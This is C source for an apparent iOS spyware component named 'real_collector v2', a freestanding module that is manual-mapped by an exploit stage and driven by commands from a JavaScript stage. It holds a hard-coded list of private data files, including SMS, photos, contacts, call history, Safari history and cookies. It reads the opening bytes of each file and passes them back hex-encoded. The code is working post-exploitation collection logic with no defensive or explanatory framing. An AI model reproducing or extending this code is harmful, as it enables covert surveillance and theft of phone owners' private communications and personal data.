/*
 * real_collector v2 — freestanding, manual-mapped by Stage3
 * No libc imports. JS FEED resolves open/read/close via ImageList, then:
 *   cmd:setapis:open=0x..,read=0x..,close=0x..
 *   cmd:read_head:/path
 *   cmd:read_fixed
 * No opendir / readdir.
 * Export: process -> _process
 */

typedef unsigned int uint32_t;
typedef unsigned char uint8_t;
typedef long long int64_t;
typedef unsigned long long uint64_t;
typedef unsigned long uintptr_t;

#define STATE_READY 3
#define STATE_EXIT  5
#define STATE_FEED  6

/* function pointers filled by setapis (JS-resolved) */
typedef int (*fn_open_t)(const char *path, int flags, ...);
typedef long long (*fn_read_t)(int fd, void *buf, unsigned long n);
typedef int (*fn_close_t)(int fd);

static fn_open_t  g_open = 0;
static fn_read_t  g_read = 0;
static fn_close_t g_close = 0;
static int g_apis_ok = 0;

/* DarkSword-style fixed path table — no enumeration */
static const char *const FIXED_PATHS[] = {
    "/private/var/mobile/Library/SMS/sms.db",
    "/var/mobile/Library/SMS/sms.db",
    "/private/var/mobile/Media/PhotoData/Photos.sqlite",
    "/var/mobile/Media/PhotoData/Photos.sqlite",
    "/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
    "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
    "/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
    "/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
    "/private/var/mobile/Library/Safari/History.db",
    "/var/mobile/Library/Safari/History.db",
    "/private/var/mobile/Library/Cookies/Cookies.binarycookies",
    "/System/Library/CoreServices/SystemVersion.plist",
    "/etc/hosts",
    0
};

static int scmp(const char *a, const char *b) {
    int i = 0;
    if (!a || !b) return 1;
    while (a[i] && b[i]) {
        if (a[i] != b[i]) return (unsigned char)a[i] - (unsigned char)b[i];
        i++;
    }
    return (unsigned char)a[i] - (unsigned char)b[i];
}

static int sncmp(const char *a, const char *b, int n) {
    int i;
    for (i = 0; i < n; i++) {
        unsigned char ca = (unsigned char)a[i];
        unsigned char cb = (unsigned char)b[i];
        if (ca != cb) return ca - cb;
        if (!ca) return 0;
    }
    return 0;
}

static int slen(const char *s) {
    int n = 0;
    if (!s) return 0;
    while (s[n]) n++;
    return n;
}

static void scopy(char *d, const char *s, int max) {
    int i = 0;
    if (!d || max <= 0) return;
    if (!s) { d[0] = 0; return; }
    while (s[i] && i < max - 1) { d[i] = s[i]; i++; }
    d[i] = 0;
}

static void buffer_set(uint32_t *D, const char *s) {
    uint8_t *p = (uint8_t *)(D + 2);
    int i;
    int n = slen(s);
    if (n > 4095) n = 4095;
    for (i = 0; i < n; i++) p[i] = (uint8_t)s[i];
    p[n] = 0;
    D[1] = (uint32_t)n;
    D[0] = STATE_READY;
}

/* append raw to out; returns new length */
static int append_str(char *out, int off, int max, const char *s) {
    int i = 0;
    if (!out || !s || off < 0) return off;
    while (s[i] && off + i < max - 1) {
        out[off + i] = s[i];
        i++;
    }
    out[off + i] = 0;
    return off + i;
}

static int append_hex_u64(char *out, int off, int max, uint64_t v) {
    const char *hex = "0123456789abcdef";
    char tmp[20];
    int n = 0, i;
    if (v == 0) {
        tmp[n++] = '0';
    } else {
        while (v && n < 16) {
            tmp[n++] = hex[v & 0xf];
            v >>= 4;
        }
    }
    /* reverse */
    for (i = n - 1; i >= 0 && off < max - 1; i--) out[off++] = tmp[i];
    out[off] = 0;
    return off;
}

static int append_int(char *out, int off, int max, long long v) {
    char tmp[24];
    int n = 0, neg = 0, i;
    if (v < 0) { neg = 1; v = -v; }
    if (v == 0) tmp[n++] = '0';
    while (v && n < 22) {
        tmp[n++] = (char)('0' + (v % 10));
        v /= 10;
    }
    if (neg && off < max - 1) out[off++] = '-';
    for (i = n - 1; i >= 0 && off < max - 1; i--) out[off++] = tmp[i];
    out[off] = 0;
    return off;
}

/* parse hex after key= into pointer; accepts 0x prefix */
static uint64_t parse_hex_ptr(const char *s) {
    uint64_t v = 0;
    int i = 0;
    if (!s) return 0;
    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) i = 2;
    for (; s[i]; i++) {
        char c = s[i];
        int d = -1;
        if (c >= '0' && c <= '9') d = c - '0';
        else if (c >= 'a' && c <= 'f') d = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') d = c - 'A' + 10;
        else break;
        v = (v << 4) | (uint64_t)d;
    }
    return v;
}

/* find key= in setapis string, return value start or 0 */
static const char *find_kv(const char *s, const char *key) {
    int kl = slen(key);
    int i = 0;
    if (!s || !key) return 0;
    while (s[i]) {
        if (sncmp(s + i, key, kl) == 0 && s[i + kl] == '=')
            return s + i + kl + 1;
        i++;
    }
    return 0;
}

static int hex_byte(char *out, int off, int max, uint8_t b) {
    const char *hex = "0123456789abcdef";
    if (off + 2 >= max) return off;
    out[off++] = hex[(b >> 4) & 0xf];
    out[off++] = hex[b & 0xf];
    out[off] = 0;
    return off;
}

/*
 * open/read head maxN bytes as hex JSON fragment into out
 * returns 1 if opened and read something (>=0), 0 on fail
 */
static int try_read_head(const char *path, int maxN, char *out, int maxOut) {
    uint8_t buf[96];
    int fd, n, i, off = 0;
    if (!g_apis_ok || !g_open || !g_read || !g_close) return 0;
    if (!path || !out || maxOut < 32) return 0;
    if (maxN > 64) maxN = 64;
    if (maxN < 1) maxN = 32;
    /* O_RDONLY = 0 */
    fd = g_open(path, 0);
    if (fd < 0) {
        off = append_str(out, 0, maxOut, "{\"path\":\"");
        off = append_str(out, off, maxOut, path);
        off = append_str(out, off, maxOut, "\",\"ok\":false,\"err\":\"open_fail\",\"fd\":");
        off = append_int(out, off, maxOut, fd);
        off = append_str(out, off, maxOut, "}");
        return 0;
    }
    n = (int)g_read(fd, buf, (unsigned long)maxN);
    g_close(fd);
    if (n < 0) n = 0;
    off = append_str(out, 0, maxOut, "{\"path\":\"");
    off = append_str(out, off, maxOut, path);
    off = append_str(out, off, maxOut, "\",\"ok\":true,\"size\":");
    off = append_int(out, off, maxOut, n);
    off = append_str(out, off, maxOut, ",\"hex\":\"");
    for (i = 0; i < n; i++) off = hex_byte(out, off, maxOut, buf[i]);
    off = append_str(out, off, maxOut, "\"}");
    return n > 0 ? 1 : 1; /* open ok counts as hit even empty */
}

static void handle_setapis(uint32_t *D, const char *args) {
    const char *o, *r, *c;
    char msg[512];
    int off = 0;
    o = find_kv(args, "open");
    r = find_kv(args, "read");
    c = find_kv(args, "close");
    if (o) g_open = (fn_open_t)(uintptr_t)parse_hex_ptr(o);
    if (r) g_read = (fn_read_t)(uintptr_t)parse_hex_ptr(r);
    if (c) g_close = (fn_close_t)(uintptr_t)parse_hex_ptr(c);
    /* also accept without 0x via plain digits already handled */
    g_apis_ok = (g_open && g_read && g_close) ? 1 : 0;
    off = append_str(msg, 0, sizeof(msg),
        "{\"ok\":");
    off = append_str(msg, off, sizeof(msg), g_apis_ok ? "true" : "false");
    off = append_str(msg, off, sizeof(msg),
        ",\"source\":\"real_collector\",\"cmd\":\"setapis\",\"open\":\"");
    off = append_hex_u64(msg, off, sizeof(msg), (uint64_t)(uintptr_t)g_open);
    off = append_str(msg, off, sizeof(msg), "\",\"read\":\"");
    off = append_hex_u64(msg, off, sizeof(msg), (uint64_t)(uintptr_t)g_read);
    off = append_str(msg, off, sizeof(msg), "\",\"close\":\"");
    off = append_hex_u64(msg, off, sizeof(msg), (uint64_t)(uintptr_t)g_close);
    off = append_str(msg, off, sizeof(msg), "\"}");
    buffer_set(D, msg);
}

static void handle_read_head(uint32_t *D, const char *path) {
    char one[768];
    char wrap[900];
    int off = 0;
    if (!g_apis_ok) {
        buffer_set(D,
            "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"read_head\","
            "\"error\":\"need_setapis\"}");
        return;
    }
    try_read_head(path, 32, one, sizeof(one));
    off = append_str(wrap, 0, sizeof(wrap),
        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"read_head\",\"item\":");
    off = append_str(wrap, off, sizeof(wrap), one);
    off = append_str(wrap, off, sizeof(wrap), "}");
    buffer_set(D, wrap);
}

static void handle_read_fixed(uint32_t *D) {
    char one[700];
    char out[4090];
    int i, off = 0, hits = 0, tried = 0;
    if (!g_apis_ok) {
        buffer_set(D,
            "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"read_fixed\","
            "\"error\":\"need_setapis\"}");
        return;
    }
    off = append_str(out, 0, sizeof(out),
        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"read_fixed\","
        "\"method\":\"fixed_path_open_read\",\"items\":[");
    for (i = 0; FIXED_PATHS[i]; i++) {
        int ok;
        if (off > 3600) break;
        tried++;
        ok = try_read_head(FIXED_PATHS[i], 32, one, sizeof(one));
        if (tried > 1) off = append_str(out, off, sizeof(out), ",");
        off = append_str(out, off, sizeof(out), one);
        if (ok && one[0] == '{' && sncmp(one, "{\"path\":", 8) == 0) {
            /* count open-ok with ok:true */
            const char *p = one;
            int j;
            for (j = 0; p[j]; j++) {
                if (sncmp(p + j, "\"ok\":true", 9) == 0) { hits++; break; }
            }
        }
    }
    off = append_str(out, off, sizeof(out), "],\"tried\":");
    off = append_int(out, off, sizeof(out), tried);
    off = append_str(out, off, sizeof(out), ",\"hits\":");
    off = append_int(out, off, sizeof(out), hits);
    off = append_str(out, off, sizeof(out), "}");
    buffer_set(D, out);
}

int process(void *buffer) {
    uint32_t *D;
    uint8_t *payload;
    uint32_t st;

    if (!buffer) return 0;
    D = (uint32_t *)buffer;
    payload = (uint8_t *)(D + 2);
    st = D[0];

    if (st == STATE_EXIT) return 0;

    if (st == STATE_FEED) {
        if (payload[0] == 'c' && payload[1] == 'm' && payload[2] == 'd' && payload[3] == ':') {
            const char *cmd = (const char *)(payload + 4);
            if (scmp(cmd, "ping") == 0) {
                char m[160];
                int o = 0;
                o = append_str(m, 0, sizeof(m),
                    "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"ping\","
                    "\"note\":\"freestanding_v2\",\"apis\":");
                o = append_str(m, o, sizeof(m), g_apis_ok ? "true" : "false");
                o = append_str(m, o, sizeof(m), "}");
                buffer_set(D, m);
                return 0;
            }
            if (sncmp(cmd, "setapis:", 8) == 0) {
                handle_setapis(D, cmd + 8);
                return 0;
            }
            if (sncmp(cmd, "read_head:", 10) == 0) {
                handle_read_head(D, cmd + 10);
                return 0;
            }
            if (scmp(cmd, "read_fixed") == 0) {
                handle_read_fixed(D);
                return 0;
            }
            /* legacy: still no opendir */
            if (scmp(cmd, "list_dcim") == 0) {
                buffer_set(D,
                    "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"list_dcim\","
                    "\"error\":\"use_read_fixed_no_opendir\"}");
                return 0;
            }
            if (sncmp(cmd, "list_dir:", 9) == 0) {
                buffer_set(D,
                    "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"list_dir\","
                    "\"error\":\"use_read_fixed_no_opendir\"}");
                return 0;
            }
            if (sncmp(cmd, "read_file:", 10) == 0) {
                /* alias to read_head */
                handle_read_head(D, cmd + 10);
                return 0;
            }
            if (scmp(cmd, "device_info") == 0) {
                buffer_set(D,
                    "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"device_info\","
                    "\"mode\":\"freestanding_v2\"}");
                return 0;
            }
            if (scmp(cmd, "exit") == 0) {
                D[0] = STATE_EXIT;
                D[1] = 0;
                return 0;
            }
            buffer_set(D,
                "{\"ok\":false,\"source\":\"real_collector\",\"error\":\"unknown_command\"}");
            return 0;
        }
        buffer_set(D,
            "{\"ok\":false,\"source\":\"real_collector\",\"error\":\"expected_cmd_prefix\"}");
        return 0;
    }

    buffer_set(D,
        "{\"ok\":true,\"source\":\"real_collector\",\"event\":\"boot\","
        "\"msg\":\"dylib_started\",\"mode\":\"freestanding_v2\"}");
    return 0;
}
